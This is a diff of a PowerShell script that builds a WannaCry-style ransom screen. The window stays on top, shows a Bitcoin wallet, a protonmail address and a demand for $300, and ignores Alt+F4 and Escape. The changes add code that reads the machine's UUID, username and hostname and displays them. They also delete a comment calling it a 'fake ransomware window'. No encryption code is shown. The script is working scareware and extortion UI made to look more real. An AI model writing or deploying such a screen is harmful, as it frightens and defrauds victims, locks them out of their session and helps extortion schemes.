@@ -9,38 +9,46 @@ $form.TopMost = $true
 $form.KeyPreview = $true
 $form.Text = 'Ooops, your files have been encrypted.'
 
-# Title Label
+# -- Header
 $title = New-Object Windows.Forms.Label
 $title.Text = "Ooops, your important files are encrypted."
-$title.Font = New-Object Drawing.Font("Consolas", 24, 'Bold')
+$title.Font = New-Object Drawing.Font("Consolas", 28, 'Bold')
 $title.ForeColor = 'Red'
 $title.AutoSize = $false
-$title.TextAlign = 'MiddleLeft'
+$title.TextAlign = 'MiddleCenter'
 $title.Dock = 'Top'
-$title.Height = 60
-$title.Padding = '20,10,0,0'
+$title.Height = 80
 $form.Controls.Add($title)
 
-# Instructions
+# -- Gather Device Info
+$deviceID = (Get-WmiObject Win32_ComputerSystemProduct).UUID
+$username = $env:USERNAME
+$hostname = $env:COMPUTERNAME
+
+# -- Main Text
 $instructions = @"
-If you see this text, then your files are no longer accessible, because they have been encrypted.
-Perhaps you are busy looking for a way to recover your files, but don't waste your time.
-Nobody can recover your files without our decryption service.
 
-We guarantee that you can recover all your files safely and easily.
-All you need to do is submit the payment and purchase the decryption key.
+Your personal files including documents, photos, and videos have been encrypted.
 
-Please follow the instructions:
-1. Send $300 worth of Bitcoin to following address:
+Device ID: $deviceID
+User: $username@$hostname
+
+To decrypt your files, you must purchase the private key.
+
+Instructions:
+1. Send $300 worth of Bitcoin to this address:
    1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
 
-2. Send your Bitcoin wallet ID and personal installation key to e-mail:
+2. Send your Bitcoin wallet ID and the following installation key to:
    wnshth123456@protonmail.com
 
-   Your personal installation key:
+   Installation Key:
    zRNaqE-CDBMFC-pD5iA4-vFdSd2-14hMs5-d7UCzb-RYj3fE-ANg8rk-49XFX2-Ed2R5A
 
-If you already purchased your key, please enter it below.
+3. After payment, you will receive your decryption key.
+
+If you already have the key, enter it below:
+
 "@
 
 $body = New-Object Windows.Forms.TextBox
@@ -48,35 +56,35 @@ $body.Multiline = $true
 $body.ReadOnly = $true
 $body.BackColor = 'Black'
 $body.ForeColor = 'White'
-$body.Font = New-Object Drawing.Font("Consolas", 14)
+$body.Font = New-Object Drawing.Font("Consolas", 13)
 $body.Text = $instructions
 $body.Dock = 'Fill'
 $form.Controls.Add($body)
 
-# Decryption Key Entry Box
+# -- Input Panel
 $inputPanel = New-Object Windows.Forms.Panel
 $inputPanel.Dock = 'Bottom'
-$inputPanel.Height = 120
+$inputPanel.Height = 100
 $inputPanel.BackColor = 'Black'
 
 $keyLabel = New-Object Windows.Forms.Label
 $keyLabel.Text = "Key:"
 $keyLabel.ForeColor = 'White'
-$keyLabel.Font = New-Object Drawing.Font("Consolas", 14)
+$keyLabel.Font = New-Object Drawing.Font("Consolas", 13)
 $keyLabel.AutoSize = $true
-$keyLabel.Location = New-Object Drawing.Point(20, 40)
+$keyLabel.Location = New-Object Drawing.Point(20, 35)
 
 $keyBox = New-Object Windows.Forms.TextBox
 $keyBox.Width = 400
-$keyBox.Font = New-Object Drawing.Font("Consolas", 14)
-$keyBox.Location = New-Object Drawing.Point(80, 36)
+$keyBox.Font = New-Object Drawing.Font("Consolas", 13)
+$keyBox.Location = New-Object Drawing.Point(80, 30)
 $keyBox.ForeColor = 'White'
 $keyBox.BackColor = 'Black'
 
 $submit = New-Object Windows.Forms.Button
 $submit.Text = "Submit"
-$submit.Font = New-Object Drawing.Font("Consolas", 12)
-$submit.Location = New-Object Drawing.Point(500, 35)
+$submit.Font = New-Object Drawing.Font("Consolas", 12, 'Bold')
+$submit.Location = New-Object Drawing.Point(500, 29)
 $submit.BackColor = 'DarkRed'
 $submit.ForeColor = 'White'
 
@@ -89,14 +97,11 @@ $inputPanel.Controls.Add($keyBox)
 $inputPanel.Controls.Add($submit)
 $form.Controls.Add($inputPanel)
 
-# Block Alt+F4 and Escape
+# -- Block closing
 $form.Add_KeyDown({
     if ($_.Alt -and $_.KeyCode -eq "F4") { $_.Handled = $true }
     if ($_.KeyCode -eq "Escape") { $_.Handled = $true }
 })
 
-# Play warning sound
 [System.Media.SystemSounds]::Exclamation.Play()
-
-# Show the fake ransomware window
 $form.ShowDialog()
